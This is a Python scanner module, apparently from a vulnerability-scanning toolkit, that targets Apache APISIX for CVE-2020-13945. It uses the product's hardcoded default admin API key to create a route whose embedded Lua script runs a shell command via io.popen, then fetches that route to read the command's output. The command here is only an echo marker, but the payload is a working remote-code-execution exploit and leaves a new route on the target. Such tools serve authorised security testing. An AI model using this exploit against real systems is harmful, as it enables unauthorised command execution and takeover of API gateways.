#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheAPISIX扫描类: 
        Apache APISIX默认密钥漏洞
            CVE-2020-13945
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class APISIX():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheAPISIX'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.success = False
        self.cve_2020_13945_payloads = [
            {
                'path': 'apisix/admin/routes',
                'data': '''{
    "uri": "/mouse",
"script": "local _M = {} \\n function _M.access(conf, ctx) \\n local f = assert(io.popen('RCECOMMAND', 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}'''
            }
        ]

    def cve_2020_13945_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'CVE-2020-13945'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1'     # * 默认密钥
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_13945_payloads:
            path = payload['path']
            data = payload['data'].replace('RCECOMMAND', 'echo ' + 'cve/2020/13945')
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res1 = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )

                logger.logging(vul_info, res1.status_code, res1)          # * LOG

                if (('create_time' in res1.text) and (res1.status_code == 201)):
                    verify_url = url + 'mouse'
                    verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        headers=headers,
                        data=data, 
                        proxies=self.proxies, 
                        verify=False
                    )
                    logger.logging(vul_info, verify_res.status_code, verify_res)      # * LOG
                else:
                    return None
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ('cve/2020/13945' in check.check_res(verify_res.text, 'cve/2020/13945')):
                results = {
                    'Target': url + 'apisix/admin/routes',
                    'Verify': url + 'mouse',
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Data': data,
                        'Headers': str(vul_info['headers'])
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2020_13945_scan, url=url)
        ]

apisix = APISIX()